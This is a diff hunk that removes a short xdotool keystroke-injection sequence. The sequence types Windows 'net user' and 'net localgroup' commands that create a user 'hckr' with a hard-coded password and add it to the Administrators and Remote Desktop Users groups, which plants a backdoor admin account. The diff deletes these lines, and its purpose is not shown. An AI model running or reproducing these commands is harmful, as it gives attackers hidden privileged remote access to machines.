@@ -1,8 +1,0 @@
-xdotool type --delay 10 "net user hckr Pwnage123 /add"
-xdotool key Return
-
-xdotool type --delay 10 "net localgroup administrators hckr /add"
-xdotool key Return
-
-xdotool type --delay 10 "net localgroup \"Remote Desktop Users\" hckr /add"
-xdotool key Return
